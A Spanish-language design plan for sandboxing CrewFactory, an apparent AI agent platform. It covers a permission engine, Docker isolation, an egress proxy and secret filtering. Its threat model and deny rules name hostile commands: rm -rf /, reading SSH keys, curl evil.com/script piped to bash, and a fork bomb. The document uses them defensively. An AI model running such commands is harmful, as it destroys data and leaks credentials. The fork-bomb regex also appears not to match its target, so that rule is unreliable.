COMPLETED
# Sandboxing Plan — CrewFactory


## Contexto

CrewFactory actualmente ejecuta comandos `bash` directamente en el servidor
via `bash-tool.ts`. No hay aislamiento de procesos, red, ni filesystem mas
alla del filtrado de secrets en output. Para produccion, esto es insuficiente.

## Threat Model

| Amenaza | Ejemplo | Severidad |
|---------|---------|-----------|
| Agente malicioso ejecuta `rm -rf /` | Bash tool sin restricciones | CRITICAL |
| Agente exfiltra datos via curl/wget | LLM persuadido a enviar datos a un C2 | HIGH |
| Agente accede a credenciales del SO | `cat ~/.ssh/id_rsa`, `env` | CRITICAL |
| Prompt injection via web fetch | Contenido web contiene instrucciones maliciosas | HIGH |
| Agente instala malware | `curl evil.com/script | bash` | CRITICAL |
| Dos por fork bomb | `:(){ :|:& };:` en bash tool | MEDIUM |
| Consumo excesivo de recursos | Loop infinito, llenar disco | MEDIUM |

## Arquitectura

```
┌─────────────────────────────────────────────┐
│  CrewFactory Server                          │
│                                              │
│  ┌─────────────┐  ┌──────────────────────┐  │
│  │ Agent Loop  │  │  Permission Engine   │  │
│  │ (runLoop)   │──│ (beforeToolCall hook)│  │
│  └──────┬──────┘  └──────────┬───────────┘  │
│         │                    │               │
│         ▼                    ▼               │
│  ┌─────────────────────────────────────┐     │
│  │         Tools                        │     │
│  │  bash │ write │ read │ edit │ ...   │     │
│  └───────┴───────┴───────┴───────┘     │     │
│         │                               │     │
│         ▼                               │     │
│  ┌─────────────────────────────────────┐     │
│  │      Sandbox Layer                   │     │
│  │                                      │     │
│  │  ┌──────────┐  ┌───────────────┐    │     │
│  │  │ Docker   │  │ Network Proxy │    │     │
│  │  │ Sandbox  │  │ (socat/mitm)  │    │     │
│  │  └──────────┘  └───────────────┘    │     │
│  │                                      │     │
│  │  ┌──────────┐  ┌───────────────┐    │     │
│  │  │ Secrets  │  │ Resource      │    │     │
│  │  │ Filter   │  │ Limits (cgroup)│   │     │
│  │  └──────────┘  └───────────────┘    │     │
│  └─────────────────────────────────────┘     │
└─────────────────────────────────────────────┘
```

---

## Fase 1: Permission Engine (beforeToolCall hook)

**Donde**: `beforeToolCall` en `AgentLoopConfig` (hook ya existe en vendor,
no lo usamos). `apps/server/src/core/sandbox/permission-engine.ts`

**Que hace**: Intercepta CADA tool call ANTES de ejecutarse, evalua reglas
de permiso. Si la regla deniega, el tool call ni se ejecuta.

```typescript
// PermissionRule: deny-first evaluation, last-match wins
interface PermissionRule {
  tool: string;                    // "bash" | "write" | "read" | "*"
  operation?: string;              // "read" | "write" | "network" | "exec"
  pattern?: RegExp;                // comando o path que matchear
  allow: boolean;                  // true=permitir, false=denegar
  reason?: string;                 // Mensaje para el usuario/agente
}

class PermissionEngine {
  private rules: PermissionRule[];

  evaluate(toolCall: ToolCall, context: ToolCallContext): PermissionVerdict {
    // 1. Deny rules se evaluan primero
    for (const rule of this.rules) {
      if (!rule.allow && this.matches(rule, toolCall)) {
        return { allow: false, reason: rule.reason };
      }
    }
    // 2. Allow rules
    for (const rule of this.rules) {
      if (rule.allow && this.matches(rule, toolCall)) {
        return { allow: true };
      }
    }
    // 3. Default: preguntar al usuario (interactive mode)
    return { allow: "ask" };
  }
}
```

**Reglas built-in por defecto:**

```typescript
const DEFAULT_RULES: PermissionRule[] = [
  // Denegar siempre operaciones destructivas
  { tool: "bash", pattern: /\brm\s+-rf\s+(\/|\/\*)/, allow: false, reason: "rm -rf / bloqueado" },
  { tool: "bash", pattern: /\bchmod\s+-R\s+777\s+\//, allow: false },
  { tool: "bash", pattern: /\bmkfs\b|\bdd\b.*\/dev\/(sd|nvme)/, allow: false },
  { tool: "bash", pattern: /\b>:\)/, allow: false, reason: "Fork bomb bloqueada" },

  // Denegar acceso a credenciales
  { tool: "read", pattern: /~\/\.ssh\//, allow: false, reason: "Acceso a SSH bloqueado" },
  { tool: "read", pattern: /~\/\.aws\//, allow: false, reason: "Acceso a AWS bloqueado" },
  { tool: "bash", pattern: /\bexport\s+.*=.*sk-[a-zA-Z0-9]{10,}/, allow: false, reason: "Exposicion de API key bloqueada" },

  // Denegar exfiltracion
  { tool: "bash", pattern: /\bcurl\s+.*\|\s*bash\b/, allow: false, reason: "curl-to-bash bloqueado" },
  { tool: "bash", pattern: /\b(curl|wget)\s+.*\/\/(evil|malicious|bad)/, allow: false }, // domains known-malos
];
```

**Wiring en AgentLoopConfig:**

```typescript
// En AgentSession.prompt():
const loopConfig = {
  // ...
  beforeToolCall: async (context: BeforeToolCallContext, signal?: AbortSignal) => {
    const verdict = permissionEngine.evaluate(context.toolCall, {
      sessionId: this.sessionId,
      username: this.username,
    });
    if (!verdict.allow) {
      return { block: true, reason: verdict.reason };
    }
    if (verdict.allow === "ask") {
      // Emitir evento de solicitud de aprobacion
      return await this.requestApproval(context.toolCall);
    }
    return undefined; // permitir
  },
};
```

---

## Fase 2: Docker Sandbox para Ejecucion de Comandos

**Donde**: `apps/server/src/core/sandbox/docker-sandbox.ts`

**Que hace**: Ejecuta comandos `bash` dentro de un contenedor Docker
desechable, no en el servidor host. Aisla procesos, filesystem, y red.

### Modo 1: Por-comando (cada bash tool crea un container temporal)

```typescript
class DockerSandbox {
  private image = "crewfactory-sandbox:latest";

  async exec(command: string, opts: ExecOptions): Promise<ExecResult> {
    const containerName = `cf-sandbox-${crypto.randomUUID().slice(0, 8)}`;
    const workDir = this.resolveWorkDir(opts.cwd);

    try {
      const args = [
        "run", "--rm",
        "--name", containerName,
        "--network", "none",              // sin red
        "--read-only",                    // filesystem read-only
        "--tmpfs", "/tmp:size=100M",      // solo /tmp escribible
        "--cap-drop", "ALL",              // sin capacidades
        "--security-opt", "no-new-privileges:true",
        "--memory", "1g",                 // limite RAM
        "--cpus", "2",                    // limite CPU
        "--pids-limit", "100",            // evitar fork bomb
        "-v", `${workDir}:/workspace:rw`, // workspace bind mount
        "-w", "/workspace",
        this.image,
        "bash", "-c", command,
      ];

      return await spawn("docker", args, { timeout: opts.timeout });
    } finally {
      // cleanup
      spawn("docker", ["rm", "-f", containerName]).catch(() => {});
    }
  }
}
```

### Modo 2: Container persistente por sesion (mas rapido, menos isolation)

Cada sesion de agente tiene su propio container que vive mientras la sesion
existe. Los comandos se ejecutan via `docker exec`.

```typescript
class SessionSandbox {
  private containers = new Map<string, string>();

  async ensureContainer(sessionId: string): Promise<string> {
    if (this.containers.has(sessionId)) return this.containers.get(sessionId)!;

    const name = `cf-session-${sessionId}`;
    await spawn("docker", [
      "run", "-d", "--rm",
      "--name", name,
      "--network", "none",
      "--cap-drop", "ALL",
      "--memory", "2g",
      "--cpus", "4",
      "-v", `${workspaceDir}:/workspace:rw`,
      "-w", "/workspace",
      sandboxImage,
      "sleep", "infinity",   // mantener vivo
    ]);

    this.containers.set(sessionId, name);
    return name;
  }

  async exec(sessionId: string, command: string): Promise<ExecResult> {
    const container = await this.ensureContainer(sessionId);
    return spawn("docker", ["exec", container, "bash", "-c", command]);
  }

  async cleanup(sessionId: string): Promise<void> {
    const container = this.containers.get(sessionId);
    if (container) {
      await spawn("docker", ["rm", "-f", container]);
      this.containers.delete(sessionId);
    }
  }
}
```

### Dockerfile del sandbox

```dockerfile
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y --no-install-recommends \
    bash curl git jq python3 nodejs npm \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m -u 1000 agent

# Sin permisos sudo
RUN echo "agent ALL=(ALL) NOPASSWD: NONE" > /etc/sudoers.d/agent

USER agent
WORKDIR /workspace
```

---

## Fase 3: Network Proxy para Control de Egreso

**Donde**: `apps/server/src/core/sandbox/network-proxy.ts`

**Que hace**: Todo trafico de red del sandbox pasa por un proxy con
allow/deny lists. Basado en `socat` o un proxy HTTP simple en Node.

```typescript
interface NetworkRule {
  domain: string;           // "api.openai.com", "*.github.com"
  allow: boolean;
  reason?: string;
}

class NetworkProxy {
  private rules: NetworkRule[] = [
    { domain: "api.openai.com", allow: true },
    { domain: "api.anthropic.com", allow: true },
    { domain: "*.github.com", allow: true },
    { domain: "registry.npmjs.org", allow: true },
    { domain: ".*", allow: false, reason: "Default-deny: dominio no autorizado" },
  ];

  async start(): Promise<{ port: number; proxyUrl: string }> {
    // Inicia proxy HTTP en un puerto local
    const server = http.createServer((req, res) => {
      const host = new URL(req.url!).hostname;
      if (!this.isAllowed(host)) {
        res.writeHead(403);
        res.end("Dominio bloqueado por politicas de seguridad");
        return;
      }
      // Proxy reverso al destino real
      proxy.web(req, res, { target: req.url! });
    });
    // ...
  }

  private isAllowed(hostname: string): boolean {
    for (const rule of this.rules) {
      if (this.matches(rule.domain, hostname)) {
        return rule.allow;
      }
    }
    return false;
  }
}
```

Luego, los contenedores Docker usan el proxy via variable de entorno:

```typescript
"-e", `http_proxy=http://host.docker.internal:${proxyPort}`,
"-e", `https_proxy=http://host.docker.internal:${proxyPort}`,
"-e", `NO_PROXY=localhost,127.0.0.1`,
```

---

## Fase 4: Secret Filtering Mejorado

**Donde**: `apps/server/src/core/sandbox/secret-filter.ts` (mejorar el
existente `bash-output-filter.ts`)

**Que hace**: Ademas de filtrar secrets en output, ahora tambien:
1. Inyecta secrets via archivo temporal (no via env vars)
2. Enmascara en tiempo real (streaming output filter)
3. Audit trail de accesos a secrets

```typescript
class SecretManager {
  // En vez de pasar secrets como ENV al container,
  // los escribe en un archivo temporal que el agente puede leer
  async injectSecrets(sessionId: string, secrets: Record<string, string>): Promise<string> {
    const secretsFile = `/tmp/cf-secrets-${sessionId}.json`;
    await writeFile(secretsFile, JSON.stringify(secrets, null, 2), { mode: 0o600 });
    return secretsFile;
  }

  // Filtro de output en streaming: reemplaza secrets con ***
  createOutputStreamFilter(username: string): TransformStream {
    const secrets = this.getUserSecrets(username).filter(Boolean);
    return new TransformStream({
      transform(chunk, controller) {
        let text = new TextDecoder().decode(chunk);
        for (const secret of secrets) {
          const escaped = secret.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
          text = text.replace(new RegExp(escaped, 'g'), '***hidden***');
        }
        controller.enqueue(new TextEncoder().encode(text));
      },
    });
  }
}
```

---

## Fase 5: Resource Limits

**Donde**: `apps/server/src/core/sandbox/resource-limits.ts`

Limites aplicados via cgroups (Linux) o argumentos de Docker:

```typescript
interface ResourceLimits {
  cpu: string;         // "2" = 2 cores
  memory: string;      // "2g"
  disk: string;        // "1g" (tmpfs size)
  pids: number;        // 100 (max processes)
  timeout: number;     // 300000 (5 min per command)
  network: boolean;    // false
  writePaths: string[]; // ["/workspace"] (paths writables)
  readPaths: string[];  // ["/workspace", "/usr/share"] (paths legibles)
}

const DEFAULT_LIMITS: ResourceLimits = {
  cpu: "2",
  memory: "2g",
  disk: "500m",
  pids: 100,
  timeout: 300_000,
  network: false,
  writePaths: ["/workspace"],
  readPaths: ["/workspace", "/usr/share/doc"],
};
```

Aplicados en el `docker run`:

```typescript
const dockerArgs = [
  "--memory", limits.memory,
  "--cpus", limits.cpu,
  "--pids-limit", String(limits.pids),
  limits.network ? "--network=bridge" : "--network=none",
  ...limits.writePaths.map(p => `-v=${p}:${p}:rw`),
  ...limits.readPaths.map(p => `-v=${p}:${p}:ro`),
];
```

---

## Fase 6: Integracion con la UI

### Sandbox Status Badge

En el header del chat, mostrar el nivel de sandboxing actual:

```tsx
// En ChatArea.tsx
<SandboxBadge
  mode={sandboxMode} // "none" | "basic" | "strict" | "container"
  onClick={() => setShowSandboxSettings(true)}
/>
```

### Sandbox Settings Panel

En Settings > General, una seccion de Sandbox:

```tsx
<SandboxSettings>
  <Select label="Sandbox mode" value={sandboxMode}>
    <option value="none">None (no isolation)</option>
    <option value="basic">Basic (permission rules only)</option>
    <option value="strict">Strict (permission rules + secret filter)</option>
    <option value="container">Container (Docker sandbox)</option>
  </Select>

  <div className="border-t pt-4 mt-4">
    <h4>Custom Permission Rules</h4>
    <PermissionRuleEditor rules={customRules} onChange={setCustomRules} />
  </div>

  <div className="border-t pt-4 mt-4">
    <h4>Allowed Network Domains</h4>
    <DomainListEditor domains={allowedDomains} onChange={setAllowedDomains} />
  </div>
</SandboxSettings>
```

### Approval Requests

Cuando una tool requiere aprobacion (permission engine responde "ask"),
mostrar un modal inline en el chat:

```tsx
<ApprovalCard
  toolName="bash"
  args={{ command: "npm install" }}
  reason="Bash execution requires approval"
  onApprove={() => handleApprove(toolCallId)}
  onDeny={() => handleDeny(toolCallId)}
/>
```

---

## Fase 7: Permission Rules UI

Los usuarios avanzados y administradores necesitan poder definir reglas
custom. La UI consiste en:

1. **Editor de reglas** tipo tabla: tool, pattern, operation, allow/deny
2. **Presets**: "Read-only", "Full Access", "Safe Mode" (ya existen como
   tool presets en la session popover, pero solo controlan que tools estan
   activas, no que patrones se permiten)
3. **Variables**: `$WORKSPACE_DIR`, `$SESSION_ID`, `$USERNAME`
4. **Testing**: "Probar regla" con un comando de ejemplo

```tsx
interface PermissionRuleUI {
  id: string;
  tool: "bash" | "write" | "read" | "edit" | "network" | "*";
  field: "command" | "path" | "url";  // que campo del toolCall evaluar
  match: "exact" | "regex" | "prefix" | "glob";
  value: string;
  action: "allow" | "deny" | "ask";
  reason: string;
  enabled: boolean;
  priority: number;
}
```

---

## Roadmap

| Fase | Que | Esfuerzo | Dependencia |
|------|-----|----------|-------------|
| **1** | Permission Engine (beforeToolCall hook) | 3-5d | Ninguna (hook ya existe) |
| **1a** | Integration con existing tool presets | 1d | Fase 1 |
| **2** | Docker Sandbox (modo por-comando) | 5-8d | Docker en servidor |
| **2a** | Docker Sandbox (modo por-sesion) | 3-5d | Fase 2 |
| **3** | Network Proxy | 3-5d | Fase 2 (containers) |
| **4** | Secret Filter mejorado (streaming + audit) | 2-3d | Ninguna |
| **5** | Resource Limits (cgroups) | 1-2d | Fase 2 |
| **6** | UI: Sandbox badge + settings + approvals | 5-8d | Fases 1-5 |
| **7** | Permission Rules UI (editor) | 5-8d | Fase 1 |

### MoSCoW

- **Must**: Fase 1 (Permission Engine) + Fase 4 (Secret Filter mejorado)
  — proteccion inmediata sin infraestructura nueva
- **Should**: Fase 6 (UI) — visibilidad del estado de sandbox al usuario
- **Could**: Fase 2 (Docker) + Fase 3 (Network Proxy) — aislamiento real
- **Wont**: Fase 7 (Rules UI avanzada) — solo si hay demanda enterprise

---

## Riesgos

| Riesgo | Impacto | Mitigacion |
|--------|---------|------------|
| Docker no disponible en servidor | Fase 2 no funciona | Fallback a permission engine + secret filter |
| Performance overhead de containers | ~1-3s por comando | Modo por-sesion (container persistente) |
| Falsos positivos en permission rules | Agente no puede hacer su trabajo | Modo "ask" permite override manual |
| Injection via workspace files | Contenido malicioso en archivos | Read-only mode para archivos no workspace |
